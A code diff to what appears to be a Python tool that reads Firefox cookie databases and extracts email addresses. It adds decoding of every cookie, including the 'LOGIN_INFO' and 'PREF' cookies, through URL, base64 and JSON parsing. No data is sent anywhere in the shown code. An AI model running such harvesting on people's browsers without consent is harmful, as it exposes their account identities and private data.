@@ -660,13 +660,72 @@ def firefox(firefox_path, email_pattern, browser_name):
                 #print(f"ERROR USING BROWSER_COOKIE3 for {browser_name}:{profile} -> {e}\nUsing normal sqlite query instead.")
                 conn = sqlite3.connect(tck)
                 cur = conn.cursor()
-                cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
+                cur.execute("SELECT name, value FROM moz_cookies")
                 for val in cur.fetchall():
+                    name = val[0]
+                    value = val[1]
+                    # url decoding
                     try:
-                        matches = re.findall(email_pattern, val[0])
-                        emails.extend(matches)
-                    except:
+                        value = urllib.parse.unquote(value)
+                        emails.extend(re.findall(email_pattern, value))
+                    except Exception as e: pass#print(f"ERROR URL DECODING : {e}")
+
+                    if name == "PREF":
+                        try:
+                            c = urllib.parse.parse_qs(value)
+                            emails.extend(find_emails_in_json(json.loads(json.dumps(c)), email_pattern))
+                            continue
+                        except Exception as e: pass#print(f"ERROR IN PARSING PREF : {e}")
+                            
+                    if name == "LOGIN_INFO":
+                        try:
+                            sig, b64_dat = value.split(':')
+                            b64_dat, _ = decode_with_fallback(base64.b64decode(b64_dat, validate=True))
+                            emails.extend(re.findall(email_pattern, b64_dat))
+                            continue
+                        except Exception as e: pass#print(f"ERROR IN LOGIN INFO PARSING : {e}")
+
+                    for delim in ['.', '-', '~', '=']:
+                        if delim in value:
+                            chunks = value.split(delim)
+                            for chunk in chunks:
+                                try:
+                                    if len(chunk) % 4 != 0: chunk += (4 - (len(chunk) % 4)) * '='
+                                    chunk = urllib.parse.unquote(chunk)
+                                    decoded_string, decoding = decode_with_fallback(base64.b64decode(chunk, validate=True))
+                                    decoded_string = urllib.parse.unquote(decoded_string)
+                                    #print(f"used delimiter {delim} for chunk {chunk} : used {decoding} and value {decoded_string}")
+
+                                    if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
+                                        emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
+
+                                    else: emails.extend(re.findall(email_pattern, decoded_string))
+                                except Exception as e: pass#print(f"ERROR in decoding with bas64 or url for delim {delim}: {e} for chunk {chunk}") 
+
+                    #base64 decoding
+                    try:
+                        decoded_string, decoding = decode_with_fallback(base64.b64decode(value, validate=True))
+                        decoded_string = urllib.parse.unquote(decoded_string)
+                        #print(f"decoded with -> {decoding} and value -> {decoded_string}")
+
+                        if decoded_string.strip().startswith('{') or decoded_string.strip().startswith('['):
+                            emails.extend(find_emails_in_json(json.loads(decoded_string), email_pattern))
+                            continue
+                        else: emails.extend(re.findall(email_pattern, decoded_string))
+                            
+                    except Exception as e: pass#print(f"ERROR in BASE64 decoding : {e}")
+
+                    #json decoding
+                    try:
+                        if value.strip().startswith('{') or value.strip().startswith('['):
+                            #print(f"IS JSON FOR {name} : {value}")
+                            emails.extend(find_emails_in_json(json.loads(value), email_pattern))
+                            continue
+                    except Exception as e:
+                        #print(f"ERROR in json DECODING : {e}")
                         pass
+
+                    emails.extend(re.findall(email_pattern, value))
                 conn.close()
 
         if os.path.exists(bh):
